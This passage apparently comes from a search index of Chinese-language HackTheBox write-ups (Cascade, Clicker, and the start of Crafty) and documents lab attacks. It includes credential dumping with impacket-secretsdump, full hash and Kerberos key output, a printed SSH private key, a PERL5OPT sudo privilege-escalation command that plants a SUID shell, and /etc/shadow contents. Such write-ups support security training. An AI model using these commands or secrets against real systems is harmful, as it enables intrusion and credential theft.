<p>\u7a0b\u5e8f\u9700\u8981\u52a0\u8f7d\u8fd9\u4e2a db \u6587\u4ef6\uff0c\u4e5f\u8bb8\u548c\u5bc6\u7801\u76f8\u5173</p>"}, {"location": "HackTheBox/Machines/Cascade/#shell-as-user-arksvc", "title": "Shell as User - ArkSvc", "text": ""}, {"location": "HackTheBox/Machines/Cascade/#_2", "title": "\u9006\u5411\u5206\u6790", "text": "<p>.net \u6846\u67b6\uff0c\u7528 dnspy \u8c03\u8bd5\u4e00\u4e0b</p> <ul> <li>dnspy \u6253\u5f00\uff0c\u6dfb\u52a0\u53c2\u6570</li> </ul> <p></p> <ul> <li>\u5728 MainModule \u4e2d\u770b\u5230\u7c7b\u4f3c\u5bc6\u7801\u89e3\u5bc6\u7684\u51fd\u6570</li> </ul> <p></p> <p>\u56e0\u6b64\u5c1d\u8bd5\u52a8\u6001\u8c03\u8bd5\uff0c\u770b\u4e00\u4e0b\u89e3\u5bc6\u540e\u7684\u503c</p> <ul> <li>\u5728\u89e3\u5bc6\u51fd\u6570\u8fd0\u884c\u540e\u6dfb\u52a0\u65ad\u70b9</li> </ul> <p></p> <ul> <li>\u5f97\u5230 ArkSvc \u51ed\u636e</li> </ul> <pre><code>export IP=10.10.10.182 DOMAIN=cascade.local USER1=r.thompson PASS1=rY4n5eva CRED1=$USER1:$PASS1 USER2=s.smith PASS2=sT333ve2 CRED2=$USER2:$PASS2 USER3=ArkSvc PASS3=w3lc0meFr31nd CRED3=$USER3:$PASS3\n</code></pre>"}, {"location": "HackTheBox/Machines/Cascade/#bloodhound_2", "title": "BloodHound", "text": "<pre><code>bloodhound-python -d $DOMAIN -u $USER3 -p $PASS3 -c all -ns $IP --zip\n</code></pre> <ul> <li>\u5728 AD RECYCLE BIN \u7ec4\u5185\uff0c\u767b\u5f55\u67e5\u770b\u5df2\u5220\u9664\u7684 AD \u5bf9\u8c61</li> </ul> <p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin</p> <pre><code>Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *\n</code></pre> <p></p> <ul> <li>\u627e\u5230 TempAdmin \u51ed\u636e</li> </ul> <pre><code>export IP=10.10.10.182 DOMAIN=cascade.local USER1=r.thompson PASS1=rY4n5eva CRED1=$USER1:$PASS1 USER2=s.smith PASS2=sT333ve2 CRED2=$USER2:$PASS2 USER3=ArkSvc PASS3=w3lc0meFr31nd CRED3=$USER3:$PASS3 USER4=TempAdmin PASS4=baCT3r1aN00dles CRED4=$USER4:$PASS4\n</code></pre> <ul> <li>\u6839\u636e\u4f1a\u8bae\u4fe1\u606f\u7684\u7ebf\u7d22\uff0c\u8fd9\u4e2a\u5bc6\u7801\u5927\u6982\u7387\u5c31\u662f administrator \u7684\u5bc6\u7801</li> </ul> <p></p> <ul> <li>\u5c1d\u8bd5\u767b\u5f55</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Cascade/#dump-hash", "title": "Dump Hash", "text": "<pre><code>impacket-secretsdump $DOMAIN/administrator:$PASS4@$IP\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n[*] Target system bootKey: 0x3c67174689c6b5a53b5e3227e338e2ad\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:d256a4c6553e66da3c7872179eeb7d26::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: \n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \nCASCADE\\CASC-DC1$:aes256-cts-hmac-sha1-96:1c3912d0fd6480fb5f77cb002f71fa2fde625457d975f1c40d143f2482f88a2a\nCASCADE\\CASC-DC1$:aes128-cts-hmac-sha1-96:fe8fba001f7898b237299e3937275473 \nCASCADE\\CASC-DC1$:des-cbc-md5:bc58e0fd23613898 \nCASCADE\\CASC-DC1$:plain_password_hex:cf9db297c8f74f54f20f3eb24ae08653125848c440f98edec4eb5e8eb0597d00ba103ddc5712f45d1cbbcbd4b1012017b8ca68af379bdde65edbe0da6ea102dc6e62a435fdd75437730f1ed992f0604bb01521090138e\n7d53b6a11465ea62ef69b30bc92c2279b986369dd44dc70822d67054adf81c3a404d8a58514d37dfb02f554b7e2b72e436a97825aa763ef49b2e89ce71a50913eaed3effdd4035cb0cd1016294f7f7f6df3f3474ea8a24ad4a104ba608e7bec7fb21da8d7c508e5142\n2bc2d7e0a52660a4492b070b11c79e0f5b7806bdea9f72eb3c62f1b46719f2f0d1a52d6d460afbf4cf8b5655e8f0f8f5e\nCASCADE\\CASC-DC1$:aad3b435b51404eeaad3b435b51404ee:39989b875ab0d4b8ad627369d7690b43:::\n[*] DefaultPassword\nCASCADE\\vbscrub:mario128 \n[*] DPAPI_SYSTEM\ndpapi_machinekey:0xfde585c8ff6d34a3e4677fd263b5acc5ce275c7c\ndpapi_userkey:0x31742d7265952f5e193ace0bb04758eaf0414edb \n[*] NL$KM \n 0000 86 51 61 06 1D D3 36 7D2D 50 2D AB 02 B9 E2 8E .Qa...6}-P-..... \n 0010 DD 3F 75 C5 DE 35 8F E4B7 D5 E6 39 5C D4 D2 DF .?u..5.....9\\...\n 0020 D7 AA A2 D3 C3 18 8B 56E3 1F 3F 77 8E 8F E0 38 .......V..?w...8 \n 0030 B9 B6 3E 5F 6C 09 F3 37E8 64 FD E1 6E 01 D6 2A ..&gt;_l..7.d..n..* \nNL$KM:865161061dd3367d2d502dab02b9e28edd3f75c5de358fe4b7d5e6395cd4d2dfd7aaa2d3c3188b56e31f3f778e8fe038b9b63e5f6c09f337e864fde16e01d62a\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) \n[*] Using the DRSUAPI method to get NTDS.DIT secrets \ncascade.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::\ncascade.local\\CascGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:3a1b37192392d74e86d04242288dc147:::\ncascade.local\\arksvc:1106:aad3b435b51404eeaad3b435b51404ee:10ffc991edaa4635cf81eb91762420cb:::\ncascade.local\\s.smith:1107:aad3b435b51404eeaad3b435b51404ee:b48b49789458698abadc119c8e310703::: \ncascade.local\\r.thompson:1109:aad3b435b51404eeaad3b435b51404ee:63251f7b1bada5082e5ffb18261ba28f:::\ncascade.local\\util:1111:aad3b435b51404eeaad3b435b51404ee:49a914ea7201025aeff21cd858ec7d66:::\ncascade.local\\j.wakefield:1116:aad3b435b51404eeaad3b435b51404ee:13ae5d7704258917054d662d016eab60::: \ncascade.local\\s.hickson:1121:aad3b435b51404eeaad3b435b51404ee:2776416ceb426c515cab11bb8411067b:::\ncascade.local\\j.goodhand:1122:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::\ncascade.local\\a.turnbull:1124:aad3b435b51404eeaad3b435b51404ee:1d6eb7e45708504e0a9646b7aea9fc9b:::\ncascade.local\\e.crowe:1127:aad3b435b51404eeaad3b435b51404ee:95d4f729c16ae37b910317d665ba2215:::\ncascade.local\\b.hanson:1128:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::\ncascade.local\\d.burman:1129:aad3b435b51404eeaad3b435b51404ee:5da61ebae419b915627f25f101fe6b1b:::\ncascade.local\\BackupSvc:1130:aad3b435b51404eeaad3b435b51404ee:c27e154566c4788326fce339f4b55491:::\ncascade.local\\j.allen:1134:aad3b435b51404eeaad3b435b51404ee:64928a685f9a995045f8c04bbf86881d:::\ncascade.local\\i.croft:1135:aad3b435b51404eeaad3b435b51404ee:431682a8242a237e805badacab95b0e4::: \nCASC-DC1$:1001:aad3b435b51404eeaad3b435b51404ee:39989b875ab0d4b8ad627369d7690b43:::\n[*] Kerberos keys grabbed \ncascade.local\\administrator:aes256-cts-hmac-sha1-96:201b2d849679d315b51959d1acd879032e1f6dba6fa9feb772a2d985edc2c2cf\ncascade.local\\administrator:aes128-cts-hmac-sha1-96:5ebdd49d14c5b62141ab0e6a2780ef70\ncascade.local\\administrator:des-cbc-md5:1532f8259b2c4f45\nkrbtgt:aes256-cts-hmac-sha1-96:25deaf37ed42e5cd95b76850d9d76fa663fcce3a9512f31357f5e45d333ca5ea \nkrbtgt:aes128-cts-hmac-sha1-96:22f5ccb8e68382406cb6e3c24c706208 \nkrbtgt:des-cbc-md5:fba77f5b31239d9e \ncascade.local\\arksvc:aes256-cts-hmac-sha1-96:3717cd1cd9e13ac692bd99e0de0bbdd7910296f8d1f465cb559f76eb63f21bcc \ncascade.local\\arksvc:aes128-cts-hmac-sha1-96:0e34dc2f704261583d5f0bfbdf4cac14\ncascade.local\\arksvc:des-cbc-md5:73f2c423982534a8\ncascade.local\\s.smith:aes256-cts-hmac-sha1-96:c5b64b93302ccfb91648acea44a708797371bcec306a74a42d614365329635ce\ncascade.local\\s.smith:aes128-cts-hmac-sha1-96:4cc2dc914d7d971f3708dba510b1a1e9 \ncascade.local\\s.smith:des-cbc-md5:6be0fdeab6cec762 \ncascade.local\\r.thompson:aes256-cts-hmac-sha1-96:d5bf934e36dbbb73b35345f08117b844874b343c9149095ff86034172272259e \ncascade.local\\r.thompson:aes128-cts-hmac-sha1-96:def0284f32bcaa0291184f0e6b2a8af0\ncascade.local\\r.thompson:des-cbc-md5:89e3da3dc74576d9\ncascade.local\\util:aes256-cts-hmac-sha1-96:9e74ea4fa951ebe411bb9d734c48202fd346a21e414bc61c49ff14b41ba14bb5 \ncascade.local\\util:aes128-cts-hmac-sha1-96:cadfed05f20d4ca27ffa30b30664dbae\ncascade.local\\util:des-cbc-md5:c4a8765b4f3db901\ncascade.local\\j.wakefield:aes256-cts-hmac-sha1-96:c3a6a1518a513ef2344859b204692d92adea4c78a6b8539e1743cfcbeb85dc5c\ncascade.local\\j.wakefield:aes128-cts-hmac-sha1-96:134734b88534d38ce5bd786bac268f07\ncascade.local\\j.wakefield:des-cbc-md5:a876678997570e6d \ncascade.local\\s.hickson:aes256-cts-hmac-sha1-96:ebdd5dd6e9d0dfac16983b005db8e84b482250740bc3e64b0e58ae30f7e7a7b5\ncascade.local\\s.hickson:aes128-cts-hmac-sha1-96:83b64186d9c5d8e74b44d6efa3b19ed7 \ncascade.local\\s.hickson:des-cbc-md5:ce8c2f9dfe3b3ddf \ncascade.local\\j.goodhand:aes256-cts-hmac-sha1-96:770b3bd99ce9b17bbf3e35a839615eb1204cbae05990db83e9393a2564c2f8ed \ncascade.local\\j.goodhand:aes128-cts-hmac-sha1-96:11ccc9eea5401915a46406441e50ed8f\ncascade.local\\j.goodhand:des-cbc-md5:fb9226a16d94ba64\ncascade.local\\a.turnbull:aes256-cts-hmac-sha1-96:4adfe6a4be270895c5a55e440e2a14d70db45f4729d82caff0c157140729f3f1 \ncascade.local\\a.turnbull:aes128-cts-hmac-sha1-96:89c3c86c69648eea1e589db7316710ae \ncascade.local\\a.turnbull:des-cbc-md5:2c076e23493ef7ba\ncascade.local\\e.crowe:aes256-cts-hmac-sha1-96:c6459e3f1647f02bd9528bca926beb8bfc944b42f3b12d9777fbdc59431fdc43\ncascade.local\\e.crowe:aes128-cts-hmac-sha1-96:6d36444d8f1b1a4bda6d7c4118ed61d9\ncascade.local\\e.crowe:des-cbc-md5:f445588fae23a729\ncascade.local\\b.hanson:aes256-cts-hmac-sha1-96:a6071c3a20a3ce2e373e8586ef7bd12cb665eb6ee66d110df57ee9f703b528f0 \ncascade.local\\b.hanson:aes128-cts-hmac-sha1-96:34f9f21922871be23e9bedc3fc1741cd\ncascade.local\\b.hanson:des-cbc-md5:57ef54d568d03e86\ncascade.local\\d.burman:aes256-cts-hmac-sha1-96:b6a2a64a272ba6c7d2cf638b8614a370d597bc167222555ec655facca6ebfe08 \ncascade.local\\d.burman:aes128-cts-hmac-sha1-96:310087249254f69e0436b2113f08909e\ncascade.local\\d.burman:des-cbc-md5:83313268372502c2\ncascade.local\\BackupSvc:aes256-cts-hmac-sha1-96:ffba7ff6b18eba90d46d787e56a0a0ebba7c8d933f992f2b896e5c7ec7da8720\ncascade.local\\BackupSvc:aes128-cts-hmac-sha1-96:854bd600cad9e7cd309eb124039b25a7\ncascade.local\\BackupSvc:des-cbc-md5:9ea4d0da8cdcbcef\ncascade.local\\j.allen:aes256-cts-hmac-sha1-96:56a9256363211ec2ac9ac5d64ddc931b10123bdf4ce4a90c4eee14aab91e401a\ncascade.local\\j.allen:aes128-cts-hmac-sha1-96:7f03f34bc8c2919a6b6ddd22c983d23c \ncascade.local\\j.allen:des-cbc-md5:a1b0c14f0ec715a8 \ncascade.local\\i.croft:aes256-cts-hmac-sha1-96:a26cfa25eeb98248137d57f00a509aca41a091218b5a9971ca6af7cd0552c469\ncascade.local\\i.croft:aes128-cts-hmac-sha1-96:ac531c4553b8f5c2f62614d91e9864e5 \ncascade.local\\i.croft:des-cbc-md5:b6f89862bf854cf1 \nCASC-DC1$:aes256-cts-hmac-sha1-96:1c3912d0fd6480fb5f77cb002f71fa2fde625457d975f1c40d143f2482f88a2a\nCASC-DC1$:aes128-cts-hmac-sha1-96:fe8fba001f7898b237299e3937275473 \nCASC-DC1$:des-cbc-md5:e0abb06801194043 \n[*] Cleaning up...\n</code></pre>"}, {"location": "HackTheBox/Machines/Clicker/", "title": "Clicker", "text": ""}, {"location": "HackTheBox/Machines/Clicker/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.11.232</p>"}, {"location": "HackTheBox/Machines/Clicker/#nmap", "title": "Nmap", "text": "<ul> <li>TCP - Scan</li> </ul> <pre><code>PORT      STATE SERVICE  VERSION\n22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)\n|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)\n80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Did not follow redirect to http://clicker.htb/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      35313/tcp6  mountd\n|   100005  1,2,3      39393/tcp   mountd\n|   100005  1,2,3      48411/udp   mountd\n|   100005  1,2,3      59425/udp6  mountd\n|   100021  1,3,4      33875/udp6  nlockmgr\n|   100021  1,3,4      34119/tcp6  nlockmgr\n|   100021  1,3,4      42749/tcp   nlockmgr\n|   100021  1,3,4      44647/udp   nlockmgr\n|   100024  1          37310/udp6  status\n|   100024  1          48201/tcp6  status\n|   100024  1          51059/tcp   status\n|   100024  1          57948/udp   status\n|   100227  3           2049/tcp   nfs_acl\n|_  100227  3           2049/tcp6  nfs_acl\n2049/tcp  open  nfs_acl  3 (RPC #100227)\n36661/tcp open  mountd   1-3 (RPC #100005)\n39393/tcp open  mountd   1-3 (RPC #100005)\n42749/tcp open  nlockmgr 1-4 (RPC #100021)\n51059/tcp open  status   1 (RPC #100024)\n56511/tcp open  mountd   1-3 (RPC #100005)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HackTheBox/Machines/Clicker/#nfs", "title": "NFS", "text": "<ul> <li>\u6302\u8f7d <code>mount -t nfs [-o vers=2] $IP:/mnt/backups /mnt/backups -o nolock</code></li> </ul> <p>\u53d1\u73b0 zip \u6587\u4ef6\uff0c\u5185\u5bb9\u662f Web \u7ad9\u70b9\u6e90\u7801</p> <p></p>"}, {"location": "HackTheBox/Machines/Clicker/#web", "title": "Web", "text": "<p>Web \u9875\u9762\u6709\u6ce8\u518c\u3001\u767b\u5f55\u3001\u67e5\u770b\u4fe1\u606f\u4e09\u4e2a\u529f\u80fd</p> <p></p>"}, {"location": "HackTheBox/Machines/Clicker/#_1", "title": "\u5ba1\u8ba1\u4ee3\u7801", "text": "<ul> <li>\u6ce8\u518c\u5904\u5bf9\u7528\u6237\u540d\u6709\u8fc7\u6ee4</li> </ul> <ul> <li>\u6709\u4e24\u4e2a\u76f4\u63a5\u62fc\u63a5\u7684 SQL \u8bed\u53e5</li> </ul> <ul> <li>\u53d1\u73b0\u4e00\u4e2a role \u53c2\u6570\uff0c\u4f3c\u4e4e\u53ef\u4ee5\u8d8a\u6743</li> </ul>"}, {"location": "HackTheBox/Machines/Clicker/#shell-as-user-www-data", "title": "Shell as User - www-data", "text": "<ul> <li>\u4f7f\u7528 CRLF \u624b\u6cd5\u7ed5\u8fc7\u9650\u5236</li> </ul> <ul> <li>\u91cd\u65b0\u767b\u5f55\u53d1\u73b0\u4e3a\u7ba1\u7406\u5458\u6743\u9650</li> </ul> <ul> <li>\u7ba1\u7406\u5458\u754c\u9762\u53ef\u4ee5\u770b\u5230\u5206\u6570\u6392\u884c\uff0c\u8fd8\u53ef\u4ee5\u5bfc\u51fa</li> </ul> <ul> <li>\u5173\u4e8e\u5bfc\u51fa\u63a5\u53e3\uff0c\u770b\u5230\u4ee3\u7801\u51fa\u53ef\u4ee5\u5bfc\u51fa\u4efb\u610f\u683c\u5f0f</li> </ul> <ul> <li>\u5c1d\u8bd5\u5bfc\u51fa\u4e3a php \u6587\u4ef6</li> </ul> <ul> <li>\u5bfc\u51fa\u6587\u4ef6</li> </ul> <ul> <li>\u5c1d\u8bd5\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u914d\u5408\u4e4b\u524d\u53d1\u73b0\u7684 save_game.php \u6587\u4ef6\uff0c\u5c1d\u8bd5\u4fee\u6539 username</li> </ul> <ul> <li>\u9875\u9762\u6ca1\u5565\u53d8\u5316</li> </ul> <ul> <li>\u53d1\u73b0\u8fd9\u91cc\u7684\u5b57\u6bb5\u540d\u662f Nickname\uff0c\u5728\u770b\u5230 authenticate.php \u6587\u4ef6</li> </ul> <ul> <li>\u4fee\u6539 nickname</li> </ul> <ul> <li>\u7531\u4e8e\u524d\u9762\u6539\u4e86 username \u5bfc\u81f4 username \u6539\u53d8\uff0c\u4f46\u662f\u4f4d\u7f6e\u4e0d\u5bf9\uff0c\u6240\u4ee5\u5e76\u6ca1\u6709\u89e3\u6790</li> </ul> <ul> <li>\u91cd\u65b0\u6ce8\u518c\u8d26\u53f7\u64cd\u4f5c\uff0c\u5148\u4fee\u6539\u5206\u6570</li> </ul> <ul> <li>\u4fee\u6539 nickname</li> </ul> <ul> <li>\u5bfc\u51fa\u4e3a php \u6587\u4ef6</li> </ul> <ul> <li>Reverse Shell</li> </ul>"}, {"location": "HackTheBox/Machines/Clicker/#linpeas", "title": "\u8dd1\u4e00\u4e0b Linpeas", "text": "<ul> <li>\u53d1\u73b0 Suid \u6587\u4ef6</li> </ul>"}, {"location": "HackTheBox/Machines/Clicker/#shell-as-user", "title": "Shell as user", "text": "<ul> <li>\u53cd\u7f16\u8bd1</li> </ul> <p>\u53d1\u73b0\u5f53\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u4e3a 0-4 \u65f6\uff0c\u4f1a\u4f20\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7ed3\u5408\u524d\u9762\u51e0\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u731c\u6d4b\u6b64\u7a0b\u5e8f\u7684\u884c\u4e3a\u5e94\u8be5\u662f\u4f7f\u7528 MySQL \u6267\u884c .sql \u6587\u4ef6\u3002</p> <ul> <li>\u521b\u5efa /tmp/123 \u5c1d\u8bd5\u8bfb\u53d6\uff0c \u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8bfb\u53d6</li> </ul> <p></p> <ul> <li>\u5c1d\u8bd5\u8bfb\u53d6 jack \u7684 id_rsa\uff0c\u591a\u6b21\u5c1d\u8bd5\uff0c\u76f8\u5bf9\u8def\u5f84\u4e3a ../.ssh/id_rsa</li> </ul> <p></p> <ul> <li>\u5bc6\u94a5\u7684\u683c\u5f0f\u4f1a\u6709\u70b9\u5c0f\u95ee\u9898\uff0c\u628a\u9996\u884c\u4e0e\u672b\u884c\u6362\u4f4d\u672c\u5730\u7684 id_rsa \u6587\u4ef6\u5185\u5bb9\u5373\u53ef\uff0c\u6743\u9650\u8bbe\u7f6e\u4e3a 0600</li> </ul> <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <ul> <li>\u767b\u5f55 jack\uff0c\u67e5\u770b sudo \u6743\u9650</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Clicker/#shell-as-root", "title": "Shell as root", "text": "<p>\u811a\u672c\u8bbe\u7f6e\u4e86\u73af\u5883\u53d8\u91cf\uff0c\u5f88\u96be\u52ab\u6301\uff0c\u53e6\u5916\u53d1\u73b0\u4e00\u4e2a xml_pp\uff0c\u53d1\u73b0\u65f6 perl \u811a\u672c</p> <p></p> <ul> <li>\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e</li> </ul> <p></p> <p></p> <p>\u5927\u81f4\u539f\u7406\u5c31\u662f\uff0c\u5f53\u542f\u52a8 Perl \u811a\u672c\u65f6\uff0c\u4f1a\u5148\u52a0\u8f7d\u6267\u884c PERL5OPT \u53d8\u91cf\u5185\u5bb9\uff0c\u521a\u597d\u6b64\u53d8\u91cf\u6ca1\u6709\u88ab\u811a\u672c\u6e05\u9664</p> <ul> <li><code>sudo PERL5OPT=-d PERL5DB='exec \"cp /bin/bash /tmp/shell;chmod +s /tmp/shell\"' /opt/monitor.sh</code></li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Clicker/#dump-hash", "title": "Dump hash", "text": "<pre><code>cat /etc/shadow\n---\nroot:$y$j9T$HwhGTqLOk.g0jLRSGt.RE.$eZjvzgetAedblJFhUTKXR3a90xzWaxtNLuQy4GSfg50:19566:0:99999:7:::\ndaemon:*:19405:0:99999:7:::\nbin:*:19405:0:99999:7:::\nsys:*:19405:0:99999:7:::\nsync:*:19405:0:99999:7:::\ngames:*:19405:0:99999:7:::\nman:*:19405:0:99999:7:::\nlp:*:19405:0:99999:7:::\nmail:*:19405:0:99999:7:::\nnews:*:19405:0:99999:7:::\nuucp:*:19405:0:99999:7:::\nproxy:*:19405:0:99999:7:::\nwww-data:*:19405:0:99999:7:::\nbackup:*:19405:0:99999:7:::\nlist:*:19405:0:99999:7:::\nirc:*:19405:0:99999:7:::\ngnats:*:19405:0:99999:7:::\nnobody:*:19405:0:99999:7:::\n_apt:*:19405:0:99999:7:::\nsystemd-network:*:19405:0:99999:7:::\nsystemd-resolve:*:19405:0:99999:7:::\nmessagebus:*:19405:0:99999:7:::\nsystemd-timesync:*:19405:0:99999:7:::\npollinate:*:19405:0:99999:7:::\nsshd:*:19405:0:99999:7:::\nsyslog:*:19405:0:99999:7:::\nuuidd:*:19405:0:99999:7:::\ntcpdump:*:19405:0:99999:7:::\ntss:*:19405:0:99999:7:::\nlandscape:*:19405:0:99999:7:::\nfwupd-refresh:*:19405:0:99999:7:::\nusbmux:*:19413:0:99999:7:::\njack:$y$j9T$9Z9lna0X87kIw1tXnLTI61$gM1HT7u59YfJwh6hGnM/pnq.EVyrRy9GNTevOgq6AW7:19415:0:99999:7:::\nlxd:!:19413::::::\nmysql:!:19413:0:99999:7:::\n_rpc:*:19415:0:99999:7:::\nstatd:*:19415:0:99999:7:::\n_laurel:!:19605::::::\n</code></pre>"}, {"location": "HackTheBox/Machines/Crafty/", "title": "Crafty", "text": ""}, {"location": "HackTheBox/Machines/Crafty/#recon-enum", "title": "Recon &amp; Enum", "text": ""}, {"location": "HackTheBox/Machines/Crafty/#nmap", "title": "Nmap", "text": "<ul> <li>Tcp</li> </ul> <pre><code>PORT      STATE SERVICE   VERSION\n80/tcp    open  http      Microsoft IIS httpd 10.0\n|_http-title: Crafty - Official Website\n| 